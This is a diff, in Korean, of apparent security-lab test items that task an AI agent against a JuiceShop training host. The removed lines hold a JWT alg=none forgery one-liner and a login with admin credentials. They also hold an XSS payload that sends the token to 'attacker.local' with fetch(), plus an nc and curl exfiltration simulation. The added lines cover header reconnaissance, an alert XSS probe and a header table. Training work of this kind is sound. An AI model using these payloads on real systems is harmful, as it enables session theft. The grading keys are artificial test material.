-    Phase 3) `python3 -c "import base64; h=base64.urlsafe_b64encode(b''{\"alg\":\"none\",\"typ\":\"JWT\"}'').rstrip(b''='').decode();
-    ..."` 형태로
-
-    변조 토큰 생성. `curl -H "Authorization: Bearer <변조>" http://10.20.32.80/rest/user/whoami`
-    로 인증 우회 시도.
+    *없는* 것을 골라내라.
 
 
-    ▶ Phase B — XSS payload 로 JWT 탈취 (lecture #1·#2)
+    ▶ Phase B — XSS 페이로드 검증 (lab #1·#2)
 
-    JuiceShop 의 search 또는 review 입력란에 stored 또는 reflected XSS payload 작성.
+    Phase A 에서 CSP 가 없다는 것을 확인했다면 반사형 XSS 가능성 *높음*.
 
-    Payload: `<script>fetch(''http://attacker.local/steal?t=''+localStorage.getItem(''token''))</script>`
+    `curl -G "http://juice.6v6.lab/#/search" --data-urlencode ''q=<img src=x onerror=alert(1)>''`
+    로
 
-    PoC 로 텍스트 출력. 실제 외부 callback 은 환경 제약 → curl 로 attacker 측 수신 시뮬레이션:
-
-    `nc -lk 9999 &` 후 `curl "http://localhost:9999/steal?t=$(JWT)"`.
-
-
-    ▶ Phase C — 인증 자격증명 방어 매트릭스
-
-    | 위협 | 공격면 | 방어 1 | 방어 2 | 잔존 위험 |
-
-    | JWT alg 변조 | server alg whitelist | strict alg check | RS256 사용 | key leak |
-
-    | localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP 설정 | XSS+CSRF chain |
-
-    | Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict | network
-    mitm |
-
-    | Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device binding | refresh
-    leak |
-
-    표 끝에 "JuiceShop 권고: alg whitelist + HttpOnly Cookie + SameSite=Strict + refresh
-    rotation" 한 줄.
+    payload reflection 여부 캡처. 응답에 payload 가 그대로 박혀 나오면 reflected XSS 확정.
 
 
-    종료: echo "=== Phase A JWT 변조 ===" / "=== Phase B XSS 탈취 ===" / "=== Phase C 매트릭스
-    ===" 묶음.
+    ▶ Phase C — 취약 헤더 5종 표 + 권고 값
+
+    | 헤더 | 현재 | 권고 값 | 위험 |
+
+    | CSP | 없음 | default-src ''self''; script-src ''self'' | XSS 무방어 |
+
+    | X-Frame-Options | 없음 | DENY | clickjacking |
+
+    | X-Content-Type-Options | 없음 | nosniff | MIME sniffing |
+
+    | Referrer-Policy | 없음 | strict-origin-when-cross-origin | 정보유출 |
+
+    | HSTS | 없음 | max-age=31536000 | 다운그레이드 |
+
+
+    종료: echo 묶음 "=== Phase A 헤더 ===" / "=== Phase B XSS reflection ===" / "=== Phase
+    C 권고표 ===".
 
 
 
     [도구 권장] **curl 단독 의존 금지**. 카테고리 `integration_scenario` 에 적합한 도구: 여러 도구 chain —
     정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로
     답변에 직접 quote** 해야 채점 통과.'
-  bastion_prompt: "[복합 시나리오 — w06 JWT 변조 + XSS 토큰 탈취 chain]\n\nJuiceShop (http://10.20.32.80)\
-    \ 인증 자격증명 chain 공격 점검 3 phase.\n\nPhase A (JWT alg 변조):\n1) `curl -s -X POST -H\
-    \ \"Content-Type: application/json\" -d '{\"email\":\"admin@juice-sh.op\",\"password\"\
-    :\"admin123\"}'\n    http://10.20.32.80/rest/user/login` 응답에서 JWT 획득.\n2) python3\
-    \ 으로 alg=none 변조 토큰 생성:\n   `python3 -c \"import base64; h=base64.urlsafe_b64encode(b'{\\\
-    \"alg\\\":\\\"none\\\",\\\"typ\\\":\\\"JWT\\\"}').rstrip(b'=').decode();\n   \
-    \ p='<원본 payload base64>'; print(f'{h}.{p}.')\"`\n3) `curl -i -H \"Authorization:\
-    \ Bearer <변조>\" http://10.20.32.80/rest/user/whoami` 결과 캡처.\n   (보통 거부됨 — 그게 JuiceShop\
-    \ 의 정상 동작)\n\nPhase B (XSS payload + JWT 탈취 시뮬레이션):\nXSS payload 텍스트 출력: `<script>fetch('http://attacker.local/steal?t='+localStorage.getItem('token'))</script>`\n\
-    공격자 측 수신 시뮬: `nc -lk 9999 &` 후 다른 터미널에서 `curl \"http://localhost:9999/steal?t=FAKEJWT\"\
-    `.\n`kill %1` 로 nc 종료. 토큰 탈취 흐름 PoC.\n\nPhase C (방어 매트릭스):\n```\n| 위협 | 공격면 |\
-    \ 방어 1 | 방어 2 | 잔존 위험 |\n| JWT alg 변조 | server alg whitelist | strict alg check\
-    \ | RS256 사용 | key leak |\n| localStorage 탈취 | XSS | HttpOnly Cookie 사용 | CSP\
-    \ 설정 | XSS+CSRF chain |\n| Cookie 탈취 | XSS + Cookie 접근 | HttpOnly + Secure | SameSite=Strict\
-    \ | network mitm |\n| Refresh token 탈취 | 영구 자격증명 | rotation + short TTL | device\
-    \ binding | refresh leak |\n```\n표 끝에 \"JuiceShop 권고: alg whitelist + HttpOnly\
-    \ Cookie + SameSite=Strict + refresh rotation\" 한 줄.\n\n종료: echo \"=== Phase A\
-    \ JWT 변조 ===\" / \"=== Phase B XSS 탈취 ===\" / \"=== Phase C 매트릭스 ===\" 묶음.\n\n\
-    반드시 3 phase 모두 실행. 중간 종료 금지.\n\n[도구 권장] integration_scenario: 여러 도구 chain — 정찰\
-    \ (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain —\
-    \ 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업** 등 적합 도구로 호출 후 stdout quote."
-  hint: 'Phase A: JWT alg=none 은 RFC 7519 의 "unsecured JWS". 라이브러리 별로 차단 정책 다름.
+  bastion_prompt: '[복합 시나리오 — w03 헤더 정찰 + XSS 검증]
 
-    Phase B: nc -lk 로 localhost 수신, curl 로 발신 — 외부 callback 없이 자체 시뮬레이션.
 
-    Phase C: 4행 매트릭스. JuiceShop 권고 한 줄.
+    JuiceShop (http://juice.6v6.lab) 대상 헤더 정찰 → XSS 검증 → 보안 헤더 권고를 3 phase 로 실행.
 
-    포인트: 단일 취약점이 아닌 *chain* — JWT 변조 + XSS 가 동시면 자격증명+권한 동시 탈취.
 
-    '
+    Phase A (헤더 정찰):
+
+    `curl -s -I http://juice.6v6.lab/` 실행. 응답 헤더 전체 출력. Server·X-Powered-By 와
+
+    CSP·X-Frame-Options·X-Content-Type-Options·Referrer-Policy·Strict-Transport-Security
+    중
+
+    *없는* 헤더 명시 (없으면 "missing").
+
+
+    Phase B (XSS reflection 검증):
+
+    `curl -sG "http://juice.6v6.lab/#/search" --data-urlencode ''q=<img src=x onerror=alert(1)>''`
+
+    실행. 응답에 페이로드가 그대로 박혀 나오는지 grep "<img src=x" 로 확인. 박혀 나오면 "Reflected XSS 확정".
+
+
+    Phase C (보안 헤더 권고표):
+
+    아래 형식 표 출력:
+
+    ```
+
+    | 헤더 | 현재 | 권고 값 | 위험 |
+
+    | CSP | 없음 | default-src ''self''; script-src ''self'' | XSS 무방어 |
+
+    | X-Frame-Options | 없음 | DENY | clickjacking |
+
+    | X-Content-Type-Options | 없음 | nosniff | MIME sniffing |
+
+    | Referrer-Policy | 없음 | strict-origin-when-cross-origin | 정보유출 |
+
+    | HSTS | 없음 | max-age=31536000 | 다운그레이드 |
+
+    ```
+
+
+    종료: echo "=== Phase A 헤더 ===" / "=== Phase B XSS reflection ===" / "=== Phase
+    C 권고표 ===" 묶음.
+
+
+    반드시 3 phase 모두 실행. 중간 종료 금지.
+
+
+    [도구 권장] integration_scenario: 여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업. curl 만 쓰지 말고 **여러 도구 chain — 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike)
+    → 후속 작업** 등 적합 도구로 호출 후 stdout quote.'
+  hint: "Phase A: curl -I (대문자) 가 HEAD 요청. -i (소문자) 는 GET 에 헤더 포함.\nPhase B: SPA 라\
+    \ #/search 클라이언트 라우팅. Bastion 환경에서는 응답이 index.html 만 와도 OK,\n   reflection 검증은\
+    \ grep 으로 payload 문자열 체크.\nPhase C: 5 헤더 권고 값은 OWASP Secure Headers Project 기준.\n\
+    포인트: \"정찰 → 검증 → 권고\" 흐름. 페이로드만 던지면 안 됨.\n"
   category: integration_scenario
   points: 50
   verify:
     type: output_contains
-    expect: 매트릭스
+    expect: 권고표
     field: stdout
     semantic:
-      intent: 'JWT alg=none 변조 + XSS 토큰 탈취 chain 점검 + 자격증명 방어 매트릭스.
+      intent: '헤더 정찰 (CSP·HSTS 등 5종 부재 확인) → 결과로 XSS reflection 검증 → 보안 헤더 권고표 작성.
 
-        lecture #1·#2·#3 + lab #7·#8·#9·#6 동시 행동 증명.
+        lecture #3·#4 (정보수집·SSL/TLS) + lab #1·#7 (반사 XSS·CSP 분석) 동시 행동 증명.
 
         '
       success_criteria:
-      - Phase A — 원본 JWT 획득 + alg=none 변조 토큰 생성 + whoami 시도
-      - Phase B — XSS payload 텍스트 + nc/curl 토큰 탈취 시뮬레이션
-      - Phase C — 4행 매트릭스 + 종합 권고 한 줄
+      - Phase A — curl -I 로 헤더 추출, 5종 보안 헤더 부재 확인
+      - Phase B — XSS payload curl 전송, reflection 여부 캡처
+      - Phase C — 4 컬럼 권고표 (헤더·현재·권고값·위험) 5행 출력
       acceptable_methods:
-      - curl POST login + python3 base64 변조
-      - nc -lk + curl 자체 시뮬
-      - markdown table 매트릭스
-      - jwt_tool / pyjwt 추가 가능
+      - curl -I / -sG / --data-urlencode
+      - grep 으로 reflection 확인
+      - markdown table 권고표
+      - sslscan / testssl.sh 추가 사용 가능
       negative_signs:
-      - JWT 획득만 하고 변조 안 함
-      - XSS payload 만 작성하고 탈취 시뮬 누락
-      - 매트릭스 누락 또는 2행 이하
-      - chain 관점 (JWT+XSS 동시) 분석 누락
+      - 헤더 정찰 없이 바로 XSS payload 던짐
+      - 권고표 누락 또는 1~2 헤더만
+      - reflection 검증 없이 payload 만 작성
+      - 기술 스택·CSP 분석 누락
   target_vm: attacker
   risk_level: low
-  answer: '🤖 위 bastion_prompt 그대로. JWT 변조 → XSS 시뮬 → 매트릭스 echo.
+  answer: '🤖 위 bastion_prompt 그대로. Bastion 이 curl -I → curl -sG payload → 권고표 echo
+    로 3 phase 처리.
 
     '
-  answer_detail: 'JWT alg=none 은 학술적 우회 — JuiceShop 은 차단됨. 그 *시도 자체* 가 학습 목표.
+  answer_detail: '헤더 정찰 결과를 XSS 점검 근거로 연결하는 흐름. CSP 부재 → 반사형 XSS 가능성 추정 → payload
+    검증.
 
-    XSS 탈취는 nc 자체 callback 으로 시뮬. 핵심은 *chain* 관점 — 두 취약점이 결합 시 영향 폭증.
+    OWASP Secure Headers Project 기준 권고 값. JuiceShop 의 실제 응답에 따라 X-Frame-Options 등
+    일부는
+
+    설정되어 있을 수 있음 — "있음/없음" 만 정확히 구분하면 OK.
 
     '
   script: ''
